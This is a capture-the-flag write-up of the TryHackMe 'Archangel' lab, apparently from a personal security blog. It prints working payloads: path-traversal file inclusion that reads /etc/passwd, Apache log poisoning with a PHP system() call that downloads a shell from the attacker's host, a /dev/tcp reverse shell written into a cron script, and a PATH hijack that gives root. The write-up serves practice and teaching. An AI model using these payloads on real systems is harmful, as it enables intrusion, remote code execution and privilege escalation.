---
title: "TryHackMe: Archangel"
author: cilgin
date: 2025-06-18 00:38:49 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.png
---

This is a write-up for the [Archangel room on TryHackMe](https://tryhackme.com/room/archangel), where I'll walk you through the shenanigans I pulled to conquer the challenges and snag the flags. Let's get hacking!

# Enumeration

## Nmap Scan

First things first, let's make life easier by saving the target IP to a variable. No one likes typing out IP addresses more than once.

```bash
export IP=10.10.58.58
```

With our target locked in, it's time to unleash `nmap` and see what doors are open.

```bash
# The nmap command and its glorious output would go here.
# Example: nmap -sC -sV -oN nmap/initial $IP
```

## Enumerating The Website

A quick browse to the IP address greets us with this little hint:
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo1.png){: width="972" height="589" }

Ah, a virtual host! The server won't talk to us unless we use its proper name. Let's add `mafialive.thm` to our `/etc/hosts`{: .filepath} file to get on the guest list.

Now that we're using the right domain, let's `curl` the website again:

```bash
curl http://mafialive.thm
<h1>UNDER DEVELOPMENT</h1>
thm{*************************}
```

Well, that was easy! A flag right on the front page. I'll take it!

## Fuzzing for Paths

Time to see what's hiding in the shadows. Let's run `gobuster` on the IP address first.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.58/
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] ...
===============================================================
/flags                (Status: 301) [--> http://10.10.58.58/flags/]
/images               (Status: 301) [--> http://10.10.58.58/images/]
/index.html           (Status: 200)
...
===============================================================
```

A `/flags` directory? That seems a little too good to be true...
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo2.png){: width="972" height="589" }

...and it was. We've been Rickrolled. A classic!

![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo3.png){: width="972" height="589" }

Let's run `gobuster` again, but this time on our fancy new domain, `mafialive.thm`.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
...
===============================================================
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/test.php             (Status: 200)
...
===============================================================
```

Now `/test.php` looks _very_ interesting. Let's see what it's all about.

```bash
❯ curl http://mafialive.thm/test.php
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
    ...
    <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
    ...
</html>
```

The page has a `view` parameter that's including a local file. This smells like a Local File Inclusion (LFI) vulnerability! Let's try to get it to read `/etc/passwd`.

```bash
❯ curl "http://mafialive.thm/test.php?view=/etc/passwd"
...
Sorry, Thats not allowed
...
```

Denied! But what if we're a little sneakier? The developers might have put a filter in place. Let's try to bypass it with some classic path traversal trickery.

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd"
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
...
```

Success! The `..//..//` trick worked. Now we can read files! Let's go for the user flag.

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"
...
thm{***_**_***_**_******}
...
```

Got it! Now, out of curiosity, let's see the source code of that `test.php` page to understand how we tricked it. We can use a PHP filter to have the server base64-encode the source for us.

```bash
❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/test.php"
...
# long base64 string appears here
...
```

Let's decode that blob of text:

```bash
❯ echo "..." | base64 -d
```

```php
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
    ...
        <?php

	   //FLAG: thm{**************}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   if(isset($_GET["view"])){
	   if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{
		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>
</html>
```

Aha! Another flag hidden in the comments! And we can see the logic: it blocks `../..` but not a single `../`. That's why our `..//..//` payload worked beautifully.

# Gaining A Shell

Reading files is cool, but a shell is way cooler. We can turn this LFI into Remote Code Execution (RCE) with a technique called log poisoning. The plan is to inject PHP code into the web server's log file, and then use our LFI to execute that log file.

1.  **Poison the Logs:** We'll send a request to the server with our malicious PHP payload as the User-Agent. This gets our code written into the `access.log`. The payload will simply download and save a reverse shell script.

    ```bash
    # On your machine, start a web server serving a PHP reverse shell script.
    # Then, send this request to poison the log:
    curl http://mafialive.thm/ -A "<?php system('wget http://<YOUR_IP>/shell.php'); ?>"
    ```

2.  **Execute the Log:** Now, use the LFI to include the Apache log file. This will execute our payload.

    ```bash
    curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var/log/apache2/access.log"
    ```

3.  **Get the Shell:** Start a listener (`nc -lvnp 4444`), then trigger the shell you just uploaded.

    ```bash
    curl http://mafialive.thm/shell.php
    ```

Boom! We should have a reverse shell as the `www-data` user.

## Upgrading the Shell

This basic shell is a bit... basic. Let's give it a full interactive TTY makeover.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Press Ctrl+Z
stty raw -echo; fg
reset
```

# Privilege Escalation

## `www-data` to `archangel`

Let's poke around. The `/opt/`{: .filepath} directory looks interesting.

```bash
www-data@ubuntu:/opt$ ls -la
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

A script named `helloworld.sh` that is world-writable? It's like they're _asking_ for a shell. This is almost certainly being run by a cron job. Let's replace its contents with our own reverse shell payload.

Set up a new listener on your machine (e.g., on port 4445), and then run this on the target:

```bash
www-data@ubuntu:/opt$ echo 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1' > /opt/helloworld.sh
```

Now we wait. After a minute, the cron job should fire, and we'll get a new shell as the `archangel` user! With these new powers, we can finally grab that second flag.

```bash
archangel@ubuntu:~/secret$ cat user2.txt
thm{********************************************}
```

## `archangel` to `root`

Inside that `secret` directory, there's another file: a binary called `backup` with the SUID bit set. This is a special gift that runs with `root` privileges.

Let's download it to our machine and see what makes it tick. Running `strings` on it gives us the jackpot:

```bash
❯ strings backup
...
cp /home/archangel/myfiles/* /opt/backupfiles
...
```

The binary runs a `cp` command, but here's the kicker: it doesn't use the full path (`/bin/cp`). This is our golden ticket! We can hijack the `PATH` to run our own malicious `cp`.

Here's the master plan:

1.  Go to a writable directory like `/tmp`.
2.  Create a file named `cp` containing a command to spawn a root shell.
3.  Make our fake `cp` executable.
4.  Add `/tmp` to the beginning of our `PATH` environment variable. This way, when the system looks for `cp`, it finds ours first.
5.  Run the SUID binary and watch the magic happen.

Let's do it:

```bash
# Navigate to our staging area
cd /tmp

# Create our malicious cp script
echo "/bin/bash -p" > cp

# Give it execute permissions
chmod +x cp

# Hijack the PATH
export PATH=/tmp:$PATH

# Run the SUID binary and claim our prize
/home/archangel/secret/backup

# whoami
root
```

And just like that, we're root! Now all that's left is to read the final flag from `/root/root.txt`. Job done!
